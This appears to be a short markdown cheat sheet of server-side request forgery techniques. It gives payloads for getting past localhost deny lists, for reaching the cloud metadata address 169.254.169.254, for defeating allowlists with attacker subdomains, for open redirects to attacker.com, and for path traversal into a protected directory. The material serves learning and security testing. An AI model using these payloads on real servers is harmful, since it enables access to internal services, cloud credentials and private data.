### Dispose rest

- When you control a subdomain, you can input a full URL, and ignore the rest by creating a new parameter:

```url
/post?server=server.website.com/flag?id=9&x=disposed
```

### Blocklist Bypass

- Bypass Deny lists denying reference to `localhost`:

```bash
0
0.0.0.0
0000
127.1
127.*.*.*
2130706433
127.0.0.1.nip.io # resolves to localhost
```

- In cloud environments, the Address `169.254.169.254` holds metadata of the deployed server. To bypass filtering, register a DNS which resolves to that IP!

### Allowlist Bypass

- There may be a list where requests are denied which don't start with `https://website.com`.
- To circumvent this, you can create a subdomain on the targets domain:

```
https://website.com.attacker-domain.com
```

### Open Redirect

- `"an endpoint on the server where the website visitor gets automatically redirected to another website address."`

```bash
https://website.com/link?url=http://attacker.com
```
-> When the server allows user input to determine the destination of a redirection
-> Bypasses all rules

### Protected Directories

- If there is a `/private` directory which you are not allowed to see, you can input the following things in a html element which sends requests:

```html
<input type="radio" name="avatar" value="assets/img/1.png">
<!-- changed to: -->
<input type="radio" name="avatar" value="private">
<!-- or: -->
<input type="radio" name="avatar" value="x/../private">
```
